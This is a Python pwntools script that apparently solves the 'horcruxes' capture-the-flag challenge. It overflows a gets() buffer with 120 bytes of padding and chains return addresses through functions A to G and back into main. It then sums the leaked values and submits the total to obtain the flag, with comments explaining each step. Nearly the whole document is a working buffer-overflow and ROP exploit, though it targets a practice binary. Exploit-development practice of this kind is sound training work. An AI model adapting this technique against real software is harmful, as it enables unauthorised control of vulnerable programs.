from pwn import *
import re
import sys
import ctypes

context.log_level = 'debug'

conn = remote('0', 9032)

#first scan:
conn.recvuntil("Select Menu:")
conn.sendline("1") #this will fail to enter any of the calls to (A to G)

#second scan: the overflow to rop part:

conn.recvuntil("How many EXP did you earned? :") 

#---------------------------------------------------
#explanation time:
#to get the flag we need to input here the sum of the horcruxes
#we can find each of their values if we call funcs A to G - each prints one of the horcruxes

#we use gets to overflow and ROP to all of the funcs A to G
#finally we ROP back into main to the instruction: call ropme (more on that later) which brings us back to ropme
#this second time when we get to the second scan we calc and input the horcruxes sum.

#----------------------------------------------------------------------------

#create payload to gets:

p = "A"*120 #overflow with garbage up to eip
p += p32(0x0809fe4b) #eip -> A's adr

#creating fake stack frames:
p += p32(0x0809fe6a) #A frame: eip -> B's adr
p += p32(0x0809fe89) #B frame: eip -> C's adr
p += p32(0x0809fea8) #C frame: eip -> D's adr
p += p32(0x0809fec7) #D frame: eip -> E's adr
p += p32(0x0809fee6) #E frame: eip -> F's adr
p += p32(0x0809ff05) #F frame: eip -> G's adr
p += p32(0x0809fffc) #G frame: eip -> the "call ropme" inside main


#-------------------------------------------------------------------
#** we cant jump back to any part of ropme because all of its adrs contain the byte 0x0a - which is the newline char : \n,
#so when we try to pass an adr that contains 0x0a it interprets that as a new line and messes up the adr.
#------------------------------------------------------------------------

#send payload:
conn.sendline(p)

#we fail to get the flag in the first try so we get this print, which we dont need:
conn.recvline().decode() #"You'd better get more experience to kill Voldemort\n"


#ROP TIME: call to A through G:

#find horcruxes:
sum = 0
for i in range(7):
	
	#get horcrux i :which is the output of A(),B(),C()...
	st = conn.recvline().decode()
	
	#find the horcrux inside the string:
	idx_start = st.index("EXP +")+5
	idx_end = st.index(")")
	val = int(st[idx_start:idx_end])
	
	#add to sum: (val & (2**32-1)) - calculates complement of two (for negative vals)
	print("found horcrux: ", i," int val: ",val, " hex val: ", hex(val & (2**32-1)))
	sum += (val & (2**32-1))


sum %= (2**32) #our final val is only four bytes: 

print("final sum after modulu is: ", ctypes.c_int32(sum).value, hex(sum))

#getting the correct int val of sum (bacause of two's complement)
sum = ctypes.c_int32(sum).value


#ROP ENDS: we return to ropme once more: 


#first scan: (for the second time)
conn.recvuntil("Select Menu:")

conn.sendline("1")

#second scan: (for the second time) 
conn.recvuntil("How many EXP did you earned? :")

# this time we send sum:
conn.sendline(str(sum))

#get the flag:
print(conn.recvall())

	
